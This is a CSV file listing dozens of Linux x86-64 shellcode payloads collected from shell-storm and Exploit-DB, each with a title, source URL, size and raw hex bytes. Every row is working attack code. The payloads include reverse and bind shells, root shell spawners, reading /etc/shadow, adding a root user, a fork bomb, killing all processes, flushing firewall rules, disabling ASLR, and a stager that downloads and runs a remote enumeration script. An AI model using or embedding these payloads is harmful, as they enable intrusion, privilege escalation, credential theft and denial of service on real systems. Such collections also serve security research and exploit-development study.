title,url,size,bytes
"setreuid (0,0) & execve('/bin/csh', ['/bin/csh', NULL]) + XOR encoded",https://shell-storm.org/shellcode/files/shellcode-816.html,87,4d31c041b1e3eb1a584831c94831db8a1c084c39c374104430cb881c0848ffc1ebede8e1ffffffabd223ab602392abd21cabd215ece608f1abd223ab6023d8bcabd231b1b4ab6a05ece60b0a1c1c1ccc818a8dcc80908b
"setreuid (0,0) & execve('/bin/ksh', ['/bin/ksh', NULL]) + XOR encoded",https://shell-storm.org/shellcode/files/shellcode-817.html,87,4d31c041b117eb1a584831c94831db8a1c084c39c374104430cb881c0848ffc1ebede8e1ffffff5f26d75f94d7665f26e85f26e11812fc055f26d75f94d72c485f26c545405f9ef11812fffee8e8e838757e79387c647f
"setreuid (0,0) & execve('/bin/zsh', ['/bin/zsh', NULL]) + XOR encoded",https://shell-storm.org/shellcode/files/shellcode-818.html,87,4d31c041b13ceb1a584831c94831db8a1c084c39c374104430cb881c0848ffc1ebede8e1ffffff740dfc74bffc4d740dc3740dca3339d72e740dfc74bffc0763740dee6e6b74b5da3339d4d5c3c3c3135e555213464f54
bindshell(port 4444),https://shell-storm.org/shellcode/files/shellcode-78.html,132,31c031db31d2b00189c6fec089c7b206b0290f05934831c050680201115c884424014889e6b21089dfb0310f05b00589c689dfb0320f0531d231f689dfb02b0f0589c74831c089c6b0210f05fec089c6b0210f05fec089c6b0210f054831d248bbff2f62696e2f736848c1eb08534889e74831c050574889e6b03b0f05505fb03c0f05
setuid(0) + execve(/bin/sh),https://shell-storm.org/shellcode/files/shellcode-77.html,49,4831ffb0690f054831d248bbff2f62696e2f736848c1eb08534889e74831c050574889e6b03b0f056a015f6a3c580f05
"execve('/bin/sh', ['/bin/sh'], NULL)",https://shell-storm.org/shellcode/files/shellcode-76.html,33,4831da48b82f73682f6e69622fff481fc3534889e74831c050514889e6b03b0f056a0158b83c000000000f05
execve('/bin/sh'),https://shell-storm.org/shellcode/files/shellcode-603.html,30,4831d248bb2f2f62696e2f736848c1eb08534889e750574889e6b03b0f05
reboot(POWER_OFF),https://shell-storm.org/shellcode/files/shellcode-602.html,19,badcfe2143be69191228bfaddee1feb0a90f05
sethostname() & killall,https://shell-storm.org/shellcode/files/shellcode-605.html,33,b0aa49b8526f6f746564202141504889e740b6080f056a3e586aff5f6a095e0f05
bash Shellcode with xor encoding,https://www.exploit-db.com/shellcodes/51258,71,4831c04889042448891c2480342408803423168034222480342132488d34244889242448892c24488d3c24b03b0f054831c04889c3b03c0f05
execve(/bin/sh) Shellcode,https://www.exploit-db.com/shellcodes/49770,21,504831d248bb2f62696e2f2f736853545fb03b0f05
execve 'cat /etc/shadow' Shellcode,https://www.exploit-db.com/shellcodes/49547,66,4831c04831ed5048bd632f736861646f775548bd2f2f2f2f2f2f6574554889e55048bb2f62696e2f636174534889e34889e7504889e255534889e6666a3b66580f05
Reverse (192.168.55.42:443/TCP) Shell + Stager + Null-Free Shellcode,https://www.exploit-db.com/shellcodes/47784,188,4831c0b006b102660fafc14831ff0f054831c0b002b106660fafc14831ff40b780666bff200f0548914831c0b00948887f94831f640b680666bf6204831d2b2074d31d241b2214d31c949c7c0fffffff0f054989c14831c0b0294831ff48ffc748ffc74831f648ffc64831d2b2060f05505f4831c050c74424fcc0a8372a66c74424fa01bb4883ec06666a024831c0b02a4889e64831d2b2100f05c89c4831d2b2294831c00f054831c0b0030f051fe14831c0b03c4831ff0f05
Reverse (127.0.0.1:4444/TCP) Shell (/bin/sh) + Password (pass) Shellcode,https://www.exploit-db.com/shellcodes/47291,120,eb0570617373046a29586a025f6a015e990f05505f31c0506870ffff108134240fffff116668115c666a02042a545e80c2100f056a025eb0210f05ffce79f85050545eb2100f0531c9488d3db6ffffff8a0f4829cffcf3a6751a31c050545a48be2f62696e2f2f736856545f5057545eb03b0f05b03c0f05
Bind (4444/TCP) Shell (/bin/sh) + Password (pass) Shellcode,https://www.exploit-db.com/shellcodes/47290,129,eb0570617373046a29586a025f6a015e990f05505f31c050665066506668115c666a020431545e80c2100f05b03231f640b6020f05b02b31f60f05505f6a025eb0210f05ffce79f85050545eb2100f0531c9488d3dadffffff8a0f4829cffcf3a6751a31c050545a48be2f62696e2f2f736856545f5057545eb03b0f05b03c0f05
execve('/bin/sh') + AVX2 XOR Decoder Shellcode,https://www.exploit-db.com/shellcodes/47292,62,eb185e488d7e01c4e27d780ec5fe6f07c5fdefc1c5fe7f07eb06e8e3ffffffaae29b6afae22348e21485c8c3c48585d9c2fce2234dfafde2234c1a91a5af
execve(/bin/sh) + NOT +SHIFT-N+ XOR-N Encoded Shellcode ,https://www.exploit-db.com/shellcodes/47183,168,eb4804013905490ed909c906c90f490e79013908e90c590c290c39083908f90d490cf90f490e5902b904c90f490e5902e904b90f490e5902a904490ef902c9067909390a990a39053905488d35b1ffffff4831c94d31c94d31d2668b0e48ffc648ffc666448b0e48ffc648ffc6564889f766448b16664531ca741549d3ea6641f7d244881748ffc648ffc648ffc7ebe166448b5602664531ca740a66448b16664531caebd6ff1424
Wget Linux Enumeration Script Shellcode,https://www.exploit-db.com/shellcodes/47151,155,6a3b589948bb2f62696e2f736800534889e7682d6300004889e652e874000000776765742068747470733a2f2f7261772e67697468756275736572636f6e74656e742e636f6d2f7265626f6f74757365722f4c696e456e756d2f6d61737465722f4c696e456e756d2e73682026262063686d6f6420373737204c696e456e756d2e7368202626202e2f4c696e456e756d2e73680056574889e60f05
Reverse (0.0.0.0:4444/TCP) Shell (/bin/sh) Shellcode,https://www.exploit-db.com/shellcodes/47025,70,6a29586a025f6a015e4831d20f0548976a0266c7442402115c546a2a585e6a105a0f056a035e6a215848ffce0f05e0f64831f65648bf2f62696e2f2f736857545fb03b990f05
execve(/bin/sh) Shellcode,https://www.exploit-db.com/shellcodes/47008,22,4831f65648bf2f62696e2f2f736857545fb03b990f05
Bind (4444/TCP) Shell (/bin/sh) Shellcode,https://www.exploit-db.com/shellcodes/46979,104,6a29586a025f6a015e4831d20f0548976a0266c7442402115c545e6a3158545e6a105a0f056a32586a015e0f056a2b584883ec10545e6a10545a0f0549926a0358500f054987fa5e6a215848ffce0f05e0f64831f65648bf2f62696e2f2f736857545fb03b990f05
Bind (4444/TCP) Shell (/bin/sh) Shellcode,https://www.exploit-db.com/shellcodes/46975,131,4831f66a29586a025f48ffc64831d20f0548974831c0505066c7442402115cc60424024831d26a3158545e4883c2100f054831f66a325848ffc60f056a2b584889e6c64424ff1048ffcc4889e20f0549926a0358500f054987fa5e6a215848ffce0f05e0f631c0043b4831ff5748bf2f62696e2f2f7368574889e74831f64831d20f05
execve(/bin/sh) Shellcode,https://www.exploit-db.com/shellcodes/46907,23,4831f65648bf2f62696e2f2f736857545f6a3b58990f05
Delete File (test.txt) Shellcode,https://www.exploit-db.com/shellcodes/46870,28,eb0d6a57585f0f054831c0b03c0f05e8eeffffff746573742e747874
Kill All Processes Shellcode,https://www.exploit-db.com/shellcodes/46492,11,6a3e586aff5f6a095e0f05
Disable ASLR Security Shellcode,https://www.exploit-db.com/shellcodes/46007,93,6a3b589948bb2f62696e2f736800534889e7682d6300004889e652e8360000006563686f2030207c207375646f20746565202f70726f632f7379732f6b65726e656c2f72616e646f6d697a655f76615f73706163650056574889e60f05
Add Root User (toor/toor) Shellcode,https://www.exploit-db.com/shellcodes/45185,99,31dbf7e350bbff737764c1eb085348bb2f6574632f706173534889e787f266be010404020f054897eb0e5e6a01586a265a0f056a3c580f05e8edffffff746f6f723a735875434b69376b3358682f733a303a303a3a2f726f6f743a2f62696e2f73680a
mkdir(evil) Shellcode,https://www.exploit-db.com/shellcodes/42791,30,eb134831c05f66beef0104530f054831c0043c0f05e8e8ffffff6576696c
Fork Bomb Shellcode,https://www.exploit-db.com/shellcodes/42523,11,4831c04883c0390f05ebf5
Kill All Processes Shellcode,https://www.exploit-db.com/shellcodes/42522,19,4831c06aff5f4883c0094889c64883c0350f05
execve(/bin/sh) Shellcode,https://www.exploit-db.com/shellcodes/42179,24,504831d24831f648bb2f62696e2f2f736853545fb03b0f05
execve(/bin/sh) Shellcode,https://www.exploit-db.com/shellcodes/42126,31,eb104831c05f4831f64831d24883c03b0f05e8ebffffff2f62696e2f2f7368
execve(/bin/sh) Shellcode,https://www.exploit-db.com/shellcodes/41750,21,f7e65048bf2f62696e2f2f7368574889e7b03b0f05
Reverse Netcat Shell (127.0.0.1:1337) Shellcode,https://www.exploit-db.com/shellcodes/41509,72,31d26833333700544889e1524889e2b82f62696e2f2f7368504889e7524889e6524889df52683132372e302e302e31504889e652682d6500504889e65252525252514889e6525153b83b0000000f05
setuid(0) + execve(/bin/sh) + Polymorphic Shellcode,https://www.exploit-db.com/shellcodes/41498,31,31ff68000000006869005048b85ec42dcd5e6e65d0504889e7b83b0000005253504889e6994831c0504889e70f05
Flush IPTables Rules (/sbin/iptables -F) + Polymorphic Shellcode,https://www.exploit-db.com/shellcodes/41503,47,68520000004831d252682d46000050534889e348c1e0012c0f48c1e12f2f7362696e2f2f68505f525351504889e60f05
Bind (Random TCP Port) Shell (/bin/sh) Shellcode,https://www.exploit-db.com/shellcodes/41468,54,68290000004831c05268020000005068010000004831d20f0531ff4889c7500f05b02b0f0552534889e74831c05048bb2f2f736800000000534889e64883c410b03b0f05
